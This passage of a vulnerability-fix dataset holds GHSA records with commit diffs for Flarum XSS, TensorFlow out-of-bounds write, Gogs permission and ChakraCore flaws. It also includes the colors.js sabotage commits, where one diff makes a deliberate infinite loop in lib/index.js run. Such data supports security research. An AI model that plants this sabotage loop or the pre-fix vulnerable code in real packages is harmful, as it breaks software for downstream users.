as soon as possible to v1.0.2 using:\n\n```\ncomposer update --prefer-dist --no-dev -a -W\n```\n\nYou can then confirm you run the latest version using:\n\n```\ncomposer show flarum\/core\n```\n\n### Workarounds\n\n__None.__\n\n### For more information\n\nFor any questions or comments on this vulnerability please visit https:\/\/discuss.flarum.org\/d\/27558.\n\nFor support questions create a discussion at https:\/\/discuss.flarum.org\/t\/support.\n\nA reminder that if you ever become aware of a security issue in Flarum, please report it to us privately by emailing security@flarum.org, and we will address it promptly.","published_date":"2021-06-07","chain_len":1,"project":"https:\/\/github.com\/flarum\/core","commit_href":"https:\/\/github.com\/flarum\/core\/commit\/440bed81b8019dff00642c8f493b4909d505a28a","commit_sha":"440bed81b8019dff00642c8f493b4909d505a28a","patch":"SINGLE","chain_ord":"['440bed81b8019dff00642c8f493b4909d505a28a']","before_first_fix_commit":"{'eeb8fe1443b98f5f622ca52b4a02732f62d1aa77'}","last_fix_commit":"440bed81b8019dff00642c8f493b4909d505a28a","chain_ord_pos":1.0,"commit_datetime":"06\/06\/2021, 01:41:48","message":"Fix XSS vulnerability","author":"David Wheatley","comments":"{'com_1': {'author': 'davwheat', 'datetime': '06\/07\/2021, 20:53:34', 'body': 'The details about this vulnerability have now been made public.\\r\\n\\r\\nFor more information, please see: https:\/\/discuss.flarum.org\/d\/27558-critical-security-update-to-flarum-core-v102'}}","stats":"{'additions': 12, 'deletions': 1, 'total': 13}","files":"{'js\/src\/common\/Translator.tsx': {'additions': 12, 'deletions': 1, 'changes': 13, 'status': 'renamed', 'raw_url': 'https:\/\/github.com\/flarum\/framework\/raw\/440bed81b8019dff00642c8f493b4909d505a28a\/js%2Fsrc%2Fcommon%2FTranslator.tsx', 'patch': \"@@ -48,12 +48,23 @@ export default class Translator {\\n     \/\/ future there should be a hook here to inspect the user and change the\\n     \/\/ translation key. This will allow a gender property to determine which\\n     \/\/ translation key is used.\\n+\\n     if ('user' in parameters) {\\n       const user = extract(parameters, 'user');\\n \\n       if (!parameters.username) parameters.username = username(user);\\n     }\\n-    return parameters;\\n+\\n+    const escapedParameters: TranslatorParameters = {};\\n+\\n+    for (const param in parameters) {\\n+      const paramValue = parameters[param];\\n+\\n+      if (typeof paramValue === 'string') escapedParameters[param] = <>{parameters[param]}<\/>;\\n+      else escapedParameters[param] = parameters[param];\\n+    }\\n+\\n+    return escapedParameters;\\n   }\\n \\n   trans(id: string, parameters: TranslatorParameters = {}) {\"}}","message_norm":"fix xss vulnerability","language":"ca","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['js\/src\/common\/Translator.tsx'])","num_files":1.0},{"index":683,"vuln_id":"GHSA-5qw5-89mw-wcg2","cwe_id":"{'CWE-787'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/97282c6d0d34476b6ba033f961590b783fa184cd'}","dataset":"osv","summary":"Out of bounds write in Tensorflow ### Impact\nTensorFlow is vulnerable to a heap OOB write in [Grappler](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/costs\/graph_properties.cc#L1132-L1141):\n\n```cc\nStatus SetUnknownShape(const NodeDef* node, int output_port) {\n  shape_inference::ShapeHandle shape = \n      GetUnknownOutputShape(node, output_port);\n  InferenceContext* ctx = GetContext(node);\n  if (ctx == nullptr) {\n    return errors::InvalidArgument(\"Missing context\");\n  }\n  ctx->set_output(output_port, shape);\n  return Status::OK();\n}\n```\n\nThe [`set_output`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/shape_inference.h#L394) function writes to an array at the specified index:\n\n```cc\nvoid set_output(int idx, ShapeHandle shape) { outputs_.at(idx) = shape; }\n```\n\nHence, this gives a malicious user a write primitive.\n\n### Patches\nWe have patched the issue in GitHub commit [97282c6d0d34476b6ba033f961590b783fa184cd](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/97282c6d0d34476b6ba033f961590b783fa184cd).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/97282c6d0d34476b6ba033f961590b783fa184cd","commit_sha":"97282c6d0d34476b6ba033f961590b783fa184cd","patch":"SINGLE","chain_ord":"['97282c6d0d34476b6ba033f961590b783fa184cd']","before_first_fix_commit":"{'557a09455bc98108bc29b3b78e818f9d7dca920f'}","last_fix_commit":"97282c6d0d34476b6ba033f961590b783fa184cd","chain_ord_pos":1.0,"commit_datetime":"11\/08\/2021, 13:48:40","message":"Prevent a crash due to heap OOB write in grappler.\n\nPiperOrigin-RevId: 408318417\nChange-Id: If095feb8c001e3a8ac4a85b7387b81e8309df47d","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'tensorflow\/core\/grappler\/costs\/graph_properties.cc': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/97282c6d0d34476b6ba033f961590b783fa184cd\/tensorflow%2Fcore%2Fgrappler%2Fcosts%2Fgraph_properties.cc', 'patch': '@@ -1134,7 +1134,12 @@ class SymbolicShapeRefiner {\\n         GetUnknownOutputShape(node, output_port);\\n     InferenceContext* ctx = GetContext(node);\\n     if (ctx == nullptr) {\\n-      return errors::InvalidArgument(\"Missing context\");\\n+      return errors::InvalidArgument(\"SetUnknownShape: Missing context\");\\n+    }\\n+    if (output_port < 0 || output_port >= ctx->num_outputs()) {\\n+      return errors::InvalidArgument(\\n+          \"SetUnknownShape: output_port must be in [0, \", ctx->num_outputs(),\\n+          \") but was \", output_port);\\n     }\\n     ctx->set_output(output_port, shape);\\n     return Status::OK();'}}","message_norm":"prevent a crash due to heap oob write in grappler.\n\npiperorigin-revid: 408318417\nchange-id: if095feb8c001e3a8ac4a85b7387b81e8309df47d","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('408318417', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/costs\/graph_properties.cc'])","num_files":1.0},{"index":684,"vuln_id":"GHSA-5r2v-6gm6-vpvh","cwe_id":"{'CWE-200'}","score":9.8,"chain":"{'https:\/\/github.com\/gogs\/gogs\/commit\/c3af3ff1d0484de3bd789ee6c6e47f35d590e945'}","dataset":"osv","summary":"Insecure Permissions in Gogs routes\/api\/v1\/api.go in Gogs 0.11.86 lacks permission checks for routes: deploy keys, collaborators, and hooks.","published_date":"2021-05-18","chain_len":1,"project":"https:\/\/github.com\/gogs\/gogs","commit_href":"https:\/\/github.com\/gogs\/gogs\/commit\/c3af3ff1d0484de3bd789ee6c6e47f35d590e945","commit_sha":"c3af3ff1d0484de3bd789ee6c6e47f35d590e945","patch":"SINGLE","chain_ord":"['c3af3ff1d0484de3bd789ee6c6e47f35d590e945']","before_first_fix_commit":"{'1592e578ed3ac7190baed6165b093002b931520c'}","last_fix_commit":"c3af3ff1d0484de3bd789ee6c6e47f35d590e945","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2019, 01:36:05","message":"routes\/api: fix permission checks for routes\n\nReported by @ManassehZhou #5764","author":"unknwon","comments":null,"stats":"{'additions': 14, 'deletions': 5, 'total': 19}","files":"{'routes\/api\/v1\/api.go': {'additions': 14, 'deletions': 5, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gogs\/gogs\/raw\/c3af3ff1d0484de3bd789ee6c6e47f35d590e945\/routes%2Fapi%2Fv1%2Fapi.go', 'patch': '@@ -112,6 +112,15 @@ func reqRepoWriter() macaron.Handler {\\n \\t}\\n }\\n \\n+func reqRepoAdmin() macaron.Handler {\\n+\\treturn func(c *context.Context) {\\n+\\t\\tif !c.Repo.IsAdmin() {\\n+\\t\\t\\tc.Error(http.StatusForbidden)\\n+\\t\\t\\treturn\\n+\\t\\t}\\n+\\t}\\n+}\\n+\\n func orgAssignment(args ...bool) macaron.Handler {\\n \\tvar (\\n \\t\\tassignOrg  bool\\n@@ -236,12 +245,12 @@ func RegisterRoutes(m *macaron.Macaron) {\\n \\t\\t\\t\\t\\t\\tPost(bind(api.CreateHookOption{}), repo.CreateHook)\\n \\t\\t\\t\\t\\tm.Combo(\"\/:id\").Patch(bind(api.EditHookOption{}), repo.EditHook).\\n \\t\\t\\t\\t\\t\\tDelete(repo.DeleteHook)\\n-\\t\\t\\t\\t}, reqAdmin())\\n+\\t\\t\\t\\t}, reqRepoAdmin())\\n \\t\\t\\t\\tm.Group(\"\/collaborators\", func() {\\n \\t\\t\\t\\t\\tm.Get(\"\", repo.ListCollaborators)\\n \\t\\t\\t\\t\\tm.Combo(\"\/:collaborator\").Get(repo.IsCollaborator).Put(bind(api.AddCollaboratorOption{}), repo.AddCollaborator).\\n \\t\\t\\t\\t\\t\\tDelete(repo.DeleteCollaborator)\\n-\\t\\t\\t\\t}, reqAdmin())\\n+\\t\\t\\t\\t}, reqRepoAdmin())\\n \\t\\t\\t\\tm.Get(\"\/raw\/*\", context.RepoRef(), repo.GetRawFile)\\n \\t\\t\\t\\tm.Get(\"\/archive\/*\", repo.GetArchive)\\n \\t\\t\\t\\tm.Get(\"\/forks\", repo.ListForks)\\n@@ -260,7 +269,7 @@ func RegisterRoutes(m *macaron.Macaron) {\\n \\t\\t\\t\\t\\t\\tPost(bind(api.CreateKeyOption{}), repo.CreateDeployKey)\\n \\t\\t\\t\\t\\tm.Combo(\"\/:id\").Get(repo.GetDeployKey).\\n \\t\\t\\t\\t\\t\\tDelete(repo.DeleteDeploykey)\\n-\\t\\t\\t\\t}, reqAdmin())\\n+\\t\\t\\t\\t}, reqRepoAdmin())\\n \\t\\t\\t\\tm.Group(\"\/issues\", func() {\\n \\t\\t\\t\\t\\tm.Combo(\"\").Get(repo.ListIssues).Post(bind(api.CreateIssueOption{}), repo.CreateIssue)\\n \\t\\t\\t\\t\\tm.Group(\"\/comments\", func() {\\n@@ -300,8 +309,8 @@ func RegisterRoutes(m *macaron.Macaron) {\\n \\t\\t\\t\\t\\t\\tDelete(reqRepoWriter(), repo.DeleteMilestone)\\n \\t\\t\\t\\t})\\n \\n-\\t\\t\\t\\tm.Patch(\"\/issue-tracker\", bind(api.EditIssueTrackerOption{}), repo.IssueTracker)\\n-\\t\\t\\t\\tm.Post(\"\/mirror-sync\", repo.MirrorSync)\\n+\\t\\t\\t\\tm.Patch(\"\/issue-tracker\", reqRepoWriter(), bind(api.EditIssueTrackerOption{}), repo.IssueTracker)\\n+\\t\\t\\t\\tm.Post(\"\/mirror-sync\", reqRepoWriter(), repo.MirrorSync)\\n \\t\\t\\t\\tm.Get(\"\/editorconfig\/:filename\", context.RepoRef(), repo.GetEditorconfig)\\n \\t\\t\\t}, repoAssignment())\\n \\t\\t}, reqToken())'}}","message_norm":"routes\/api: fix permission checks for routes\n\nreported by @manassehzhou #5764","language":"en","entities":"[('fix', 'ACTION', ''), ('permission', 'SECWORD', ''), ('#5764', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['routes\/api\/v1\/api.go'])","num_files":1.0},{"index":688,"vuln_id":"GHSA-5rcr-q3rx-j7vr","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/75162b7f2d8ac2b37d17564e9c979ba1bae707e8', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/214dec9461f9acb9a4b9004368d2a81e0c125652'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1062, CVE-2019-1092, CVE-2019-1103, CVE-2019-1106.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/214dec9461f9acb9a4b9004368d2a81e0c125652","commit_sha":"214dec9461f9acb9a4b9004368d2a81e0c125652","patch":"MULTI","chain_ord":"['214dec9461f9acb9a4b9004368d2a81e0c125652', '75162b7f2d8ac2b37d17564e9c979ba1bae707e8']","before_first_fix_commit":"{'12c31f0e83ddc511e57b9aa1e78533899199eb32', 'ba1f4455f921ce5f12091ff8a11c8028c6a64b17'}","last_fix_commit":"75162b7f2d8ac2b37d17564e9c979ba1bae707e8","chain_ord_pos":1.0,"commit_datetime":"06\/06\/2019, 19:58:34","message":"[CVE-2019-1107] Chakra JIT Type Confusion FinishOptPropOp","author":"Paul Leathers","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'lib\/Backend\/GlobOptFields.cpp': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/214dec9461f9acb9a4b9004368d2a81e0c125652\/lib%2FBackend%2FGlobOptFields.cpp', 'patch': '@@ -410,6 +410,14 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo\\n         if (inGlobOpt)\\n         {\\n             KillObjectHeaderInlinedTypeSyms(this->currentBlock, false);\\n+            if (this->objectTypeSyms)\\n+            {\\n+                if (this->currentBlock->globOptData.maybeWrittenTypeSyms == nullptr)\\n+                {\\n+                    this->currentBlock->globOptData.maybeWrittenTypeSyms = JitAnew(this->alloc, BVSparse<JitArenaAllocator>, this->alloc);\\n+                }\\n+                this->currentBlock->globOptData.maybeWrittenTypeSyms->Or(this->objectTypeSyms);\\n+            }\\n         }\\n \\n         \/\/ fall through'}}","message_norm":"[cve-2019-1107] chakra jit type confusion finishoptpropop","language":"en","entities":"[('cve-2019-1107', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOptFields.cpp'])","num_files":1.0},{"index":693,"vuln_id":"GHSA-5rqg-jm4f-cqx7","cwe_id":"{'CWE-835'}","score":0.0,"chain":"{'https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75', 'https:\/\/github.com\/Marak\/colors.js\/commit\/137c6dae3339e97f4bbc838c221803c363b0a9fd', 'https:\/\/github.com\/Marak\/colors.js\/commit\/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26'}","dataset":"osv","summary":"Infinite loop causing Denial of Service in colors colors is a library for including colored text in node.js consoles. Between 07 and 09 January 2022, colors versions 1.4.1, 1.4.2, and 1.4.44-liberty-2 were published including malicious code that caused a Denial of Service due to an infinite loop. Software dependent on these versions experienced the printing of randomized characters to console and an infinite loop resulting in unbound system resource consumption.\n\nUsers of colors relying on these specific versions should downgrade to version 1.4.0.","published_date":"2022-01-10","chain_len":3,"project":"https:\/\/github.com\/Marak\/colors.js","commit_href":"https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75","commit_sha":"5d2d242f656103ac38086d6b26433a09f1c38c75","patch":"MULTI","chain_ord":"['137c6dae3339e97f4bbc838c221803c363b0a9fd', '5d2d242f656103ac38086d6b26433a09f1c38c75', '6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26']","before_first_fix_commit":"{'5d2d242f656103ac38086d6b26433a09f1c38c75'}","last_fix_commit":"6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26","chain_ord_pos":2.0,"commit_datetime":"01\/08\/2022, 04:21:02","message":"Fix bug","author":"Marak","comments":"{'com_1': {'author': 'bacloud22', 'datetime': '01\/08\/2022, 07:00:53', 'body': 'oops, now it works \ud83e\udd23'}, 'com_2': {'author': 'AuroPick', 'datetime': '01\/10\/2022, 01:19:13', 'body': 'delete this shit'}, 'com_3': {'author': 'KeZengOo', 'datetime': '01\/10\/2022, 02:21:07', 'body': 'Amazing\uff01'}, 'com_4': {'author': 'summic', 'datetime': '01\/10\/2022, 02:48:32', 'body': 'Disgusting!'}, 'com_5': {'author': 'zhang354455288', 'datetime': '01\/10\/2022, 06:50:25', 'body': 'niubi laotie'}, 'com_6': {'author': 'yyg1219', 'datetime': '01\/10\/2022, 07:10:16', 'body': 'niua niua'}, 'com_7': {'author': 'zhangwenwen12138', 'datetime': '01\/10\/2022, 08:10:05', 'body': '\u94c1\u5b50\uff0c\u4f60\u600e\u4e48\u4e86'}, 'com_8': {'author': 'vaecebyZ', 'datetime': '01\/10\/2022, 09:31:36', 'body': \"While we sympathize with you, you're doing a disservice to other developers.\ud83d\ude28\"}, 'com_9': {'author': 'chen-fac', 'datetime': '01\/10\/2022, 09:37:07', 'body': '\u524d\u6392\u51fa\u552e\u82b1\u751f\u74dc\u5b50'}, 'com_10': {'author': 'DragonCat1', 'datetime': '01\/10\/2022, 09:52:22', 'body': '\u5e7f\u544a\u4f4d\u62db\u79df'}, 'com_11': {'author': 'evanchen0629', 'datetime': '01\/10\/2022, 09:53:53', 'body': '\u524d\u9762\u7684\u540c\u5fd7\u628a\u811a\u6536\u4e00\u6536'}, 'com_12': {'author': 'wokalek', 'datetime': '01\/10\/2022, 09:58:35', 'body': 'Starege'}, 'com_13': {'author': 'brolnickij', 'datetime': '01\/10\/2022, 10:17:54', 'body': 'nice trolling :D'}, 'com_14': {'author': 'withsalt', 'datetime': '01\/10\/2022, 10:26:09', 'body': 'nice code!'}, 'com_15': {'author': 'Ansen', 'datetime': '01\/10\/2022, 10:29:24', 'body': 'six six six'}, 'com_16': {'author': 'SheltonZhu', 'datetime': '01\/10\/2022, 10:39:39', 'body': 'brilliant !!!!!'}, 'com_17': {'author': 'mxj1337', 'datetime': '01\/10\/2022, 11:00:51', 'body': 'LIKE'}, 'com_18': {'author': 'WeirdConstructor', 'datetime': '01\/10\/2022, 12:33:35', 'body': 'Obviously this bugfix is missing a regression test! ;-)'}, 'com_19': {'author': 'wuzhidexiaolang', 'datetime': '01\/10\/2022, 14:28:13', 'body': 'nice'}, 'com_20': {'author': 'manudevcode', 'datetime': '01\/10\/2022, 16:02:59', 'body': \"Lol, when your intentional error, doesn't work xD\"}, 'com_21': {'author': 'LuciusChen', 'datetime': '01\/10\/2022, 16:18:08', 'body': '\u725b\u903c\u554a'}, 'com_22': {'author': 'golangboy', 'datetime': '01\/10\/2022, 17:01:00', 'body': '\u524d\u7aef\u5708\u771f\u70ed\u95f9'}, 'com_23': {'author': 'prietales', 'datetime': '01\/10\/2022, 17:53:17', 'body': 'let am should be const.'}, 'com_24': {'author': 'xinx1n', 'datetime': '01\/11\/2022, 02:20:44', 'body': '\u82df\u5229\u56fd\u5bb6\u751f\u6b7b\u4ee5'}, 'com_25': {'author': 'paoqi1997', 'datetime': '01\/11\/2022, 02:20:59', 'body': '12, 3456'}, 'com_26': {'author': 'manudevcode', 'datetime': '01\/11\/2022, 03:31:54', 'body': '> 12, 3456\\r\\n\\r\\nLa tuya por si las dudas xD'}, 'com_27': {'author': '949nb', 'datetime': '01\/11\/2022, 06:47:08', 'body': 'nice code!'}, 'com_28': {'author': 'npljy', 'datetime': '01\/11\/2022, 08:20:14', 'body': \"If you want to make money from open source, then don't open source\"}, 'com_29': {'author': 'machinebitezz', 'datetime': '01\/11\/2022, 14:24:03', 'body': 'Power to you tbh'}, 'com_30': {'author': 'ethnh', 'datetime': '01\/11\/2022, 16:19:27', 'body': '\ud83d\udd34\ud83d\udfe0\ud83d\udfe1\ud83d\udfe2\ud83d\udd35\ud83d\udfe3\ud83d\udfe4\u26ab\u26aa nice colors'}, 'com_31': {'author': 'zhushiqiang', 'datetime': '01\/12\/2022, 01:47:25', 'body': '666'}, 'com_32': {'author': 'zhushiqiang', 'datetime': '01\/12\/2022, 13:39:52', 'body': '\u8fd9\u662f\u6765\u81eaQQ\u90ae\u7bb1\u7684\u5047\u671f\u81ea\u52a8\u56de\u590d\u90ae\u4ef6\u3002\\n\\xa0\\n\u60a8\u597d\uff0c\u6211\u6700\u8fd1\u6b63\u5728\u4f11\u5047\u4e2d\uff0c\u65e0\u6cd5\u4eb2\u81ea\u56de\u590d\u60a8\u7684\u90ae\u4ef6\u3002\u6211\u5c06\u5728\u5047\u671f\u7ed3\u675f\u540e\uff0c\u5c3d\u5feb\u7ed9\u60a8\u56de\u590d\u3002'}, 'com_33': {'author': 'joaodematejr', 'datetime': '01\/13\/2022, 02:30:37', 'body': '@brunoibias'}, 'com_34': {'author': 'Rusnura', 'datetime': '01\/13\/2022, 03:18:05', 'body': 'Hello World!'}, 'com_35': {'author': 'a6513375', 'datetime': '01\/13\/2022, 13:39:17', 'body': '> \\r\\n\\r\\n\u6211\u8d85'}, 'com_36': {'author': 'zbeanbean', 'datetime': '01\/14\/2022, 06:26:34', 'body': 'wondeful'}, 'com_37': {'author': 'PalmDevs', 'datetime': '01\/19\/2022, 09:58:13', 'body': 'Reject `let`, `const`. Return to `var`. \ud83d\ude0f'}, 'com_38': {'author': 'TechStudent10', 'datetime': '01\/19\/2022, 12:10:56', 'body': 'What bug are you fixing exactly?'}, 'com_39': {'author': 'frankhasen', 'datetime': '01\/19\/2022, 14:07:04', 'body': '> What bug are you fixing exactly?\\r\\n\\r\\nfixing capitalizm bro'}, 'com_40': {'author': 'TechStudent10', 'datetime': '01\/19\/2022, 14:48:09', 'body': '> > What bug are you fixing exactly?\\r\\n> \\r\\n> fixing capitalizm bro\\r\\n\\r\\ntrue i guess.'}, 'com_41': {'author': 'joerez', 'datetime': '01\/20\/2022, 21:33:57', 'body': 'put me in the screencap'}, 'com_42': {'author': 'aaj', 'datetime': '01\/20\/2022, 21:38:03', 'body': 'witnessed'}, 'com_43': {'author': 'yasath', 'datetime': '01\/28\/2022, 14:20:12', 'body': 'so real bestie'}, 'com_44': {'author': 'N1ark', 'datetime': '01\/28\/2022, 14:21:12', 'body': 'we stan'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Marak\/colors.js\/raw\/5d2d242f656103ac38086d6b26433a09f1c38c75\/lib%2Findex.js', 'patch': \"@@ -15,7 +15,7 @@ require('.\/extendStringPrototype')();\\n \/* remove this line after testing *\/\\n let am = require('..\/lib\/custom\/american');\\n am();\\n-for (let i = 666; i < Infinity; i++;) {\\n+for (let i = 666; i < Infinity; i++) {\\n   if (i % 333) {\\n     \/\/ console.log('testing'.zalgo.rainbow)\\n   }\"}}","message_norm":"fix bug","language":"en","entities":"[('fix', 'ACTION', ''), ('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":694,"vuln_id":"GHSA-5rqg-jm4f-cqx7","cwe_id":"{'CWE-835'}","score":0.0,"chain":"{'https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75', 'https:\/\/github.com\/Marak\/colors.js\/commit\/137c6dae3339e97f4bbc838c221803c363b0a9fd', 'https:\/\/github.com\/Marak\/colors.js\/commit\/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26'}","dataset":"osv","summary":"Infinite loop causing Denial of Service in colors colors is a library for including colored text in node.js consoles. Between 07 and 09 January 2022, colors versions 1.4.1, 1.4.2, and 1.4.44-liberty-2 were published including malicious code that caused a Denial of Service due to an infinite loop. Software dependent on these versions experienced the printing of randomized characters to console and an infinite loop resulting in unbound system resource consumption.\n\nUsers of colors relying on these specific versions should downgrade to version 1.4.0.","published_date":"2022-01-10","chain_len":3,"project":"https:\/\/github.com\/Marak\/colors.js","commit_href":"https:\/\/github.com\/Marak\/colors.js\/commit\/137c6dae3339e97f4bbc838c221803c363b0a9fd","commit_sha":"137c6dae3339e97f4bbc838c221803c363b0a9fd","patch":"MULTI","chain_ord":"['137c6dae3339e97f4bbc838c221803c363b0a9fd', '5d2d242f656103ac38086d6b26433a09f1c38c75', '6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26']","before_first_fix_commit":"{'5d2d242f656103ac38086d6b26433a09f1c38c75'}","last_fix_commit":"6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26","chain_ord_pos":1.0,"commit_datetime":"01\/08\/2022, 04:19:44","message":"Bump to `v1.4.44-liberty`","author":"Marak","comments":"{'com_1': {'author': 'LeviPesin', 'datetime': '01\/12\/2022, 06:18:26', 'body': 'No one have commented on this commit yet :-)'}, 'com_2': {'author': 'hello-smile6', 'datetime': '01\/14\/2022, 04:57:47', 'body': '> No one have commented on this commit yet :-)\\r\\n\\r\\nMake that 2 people'}, 'com_3': {'author': 'hello-smile6', 'datetime': '01\/14\/2022, 04:57:52', 'body': '@LeviPesin'}, 'com_4': {'author': 'TechStudent10', 'datetime': '01\/20\/2022, 14:09:20', 'body': '`liberty-1`'}, 'com_5': {'author': 'Fabrisdev', 'datetime': '01\/23\/2022, 22:51:03', 'body': 'now 5'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'package.json': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Marak\/colors.js\/raw\/137c6dae3339e97f4bbc838c221803c363b0a9fd\/package.json', 'patch': '@@ -1,7 +1,7 @@\\n {\\n     \"name\": \"colors\",\\n     \"description\": \"get colors in your node.js console\",\\n-    \"version\": \"1.4.0\",\\n+    \"version\": \"1.4.44-liberty\",\\n     \"author\": \"Marak Squires\",\\n     \"contributors\": [\\n         {'}}","message_norm":"bump to `v1.4.44-liberty`","language":"en","entities":"[('v1.4.44', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['package.json'])","num_files":1.0},{"index":695,"vuln_id":"GHSA-5rqg-jm4f-cqx7","cwe_id":"{'CWE-835'}","score":0.0,"chain":"{'https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75', 'https:\/\/github.com\/Marak\/colors.js\/commit\/137c6dae3339e97f4bbc838c221803c363b0a9fd', 'https:\/\/github.com\/Marak\/colors.js\/commit\/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26'}","dataset":"osv","summary":"Infinite loop causing Denial of Service in colors colors is a library for including colored text in node.js consoles. Between 07 and 09 January 2022, colors versions 1.4.1, 1.4.2, and 1.4.44-liberty-2 were published including malicious code that caused a Denial of Service due to an infinite loop. Software dependent on these versions experienced the printing of randomized characters to console and an infinite loop resulting in unbound system resource consumption.\n\nUsers of colors relying on these specific versions should downgrade to version 1.4.0.","published_date":"2022-01-10","chain_len":3,"project":"https:\/\/github.com\/Marak\/colors.js","commit_href":"https:\/\/github.com\/Marak\/colors.js\/commit\/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26","commit_sha":"6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26","patch":"MULTI","chain_ord":"['137c6dae3339e97f4bbc838c221803c363b0a9fd', '5d2d242f656103ac38086d6b26433a09f1c38c75', '6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26']","before_first_fix_commit":"{'5d2d242f656103ac38086d6b26433a09f1c38c75'}","last_fix_commit":"6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26","chain_ord_pos":3.0,"commit_datetime":"01\/08\/2022, 04:22:34","message":"Bump to `v1.4.44-liberty-2`","author":"Marak","comments":"{'com_1': {'author': 'belauzas', 'datetime': '01\/08\/2022, 09:12:51', 'body': 'What is this? Why console is trashed with all this random shit?'}, 'com_2': {'author': 'legalsec', 'datetime': '01\/08\/2022, 13:20:11', 'body': '> \\r\\n\\r\\n@belauzas .... See here: https:\/\/news.ycombinator.com\/item?id=25032105\\r\\nand here: https:\/\/github.com\/Marak\/colors.js\/commit\/074a0f8ed0c31c35d13d28632bd8a049ff136fb6\\r\\nMillions of downloads a week... not a penny to show for it.'}, 'com_3': {'author': 'atridadl', 'datetime': '01\/09\/2022, 21:53:33', 'body': 'What a child.'}, 'com_4': {'author': 'zmaktouf', 'datetime': '01\/10\/2022, 01:18:25', 'body': 'Everyone should contribute with $1 to the author. He will get the money he deserves.\\r\\nI am not using `colors.js`, but I will be happy to contribute'}, 'com_5': {'author': 'ImJustChew', 'datetime': '01\/10\/2022, 04:06:49', 'body': 'irresponsible, wasted my time.'}, 'com_6': {'author': 'add1609', 'datetime': '01\/10\/2022, 04:08:27', 'body': '@Marak you 100% deserve to get paid for your work. Please provide someway to send you money.'}, 'com_7': {'author': 'BARMPlus', 'datetime': '01\/10\/2022, 06:33:52', 'body': 'What really happened with Aaron Swartz?'}, 'com_8': {'author': 'connor-sarah', 'datetime': '01\/10\/2022, 06:35:44', 'body': 'freeloaders'}, 'com_9': {'author': 'dmitrykurmanov', 'datetime': '01\/10\/2022, 07:52:07', 'body': \"> Everyone should contribute with $1 to the author. He will get the money he deserves. I am not using `colors.js`, but I will be happy to contribute\\r\\n\\r\\nand let's pay to terrorists too because that is the same meaning I think\"}, 'com_10': {'author': 'ImJustChew', 'datetime': '01\/10\/2022, 08:25:47', 'body': \"Paying doesn't solve the problem. Wait till more developers expect people to pay for their open-source code forcefully and see how everything slowly reverts back to closed-source.\"}, 'com_11': {'author': 'piotrtomiak', 'datetime': 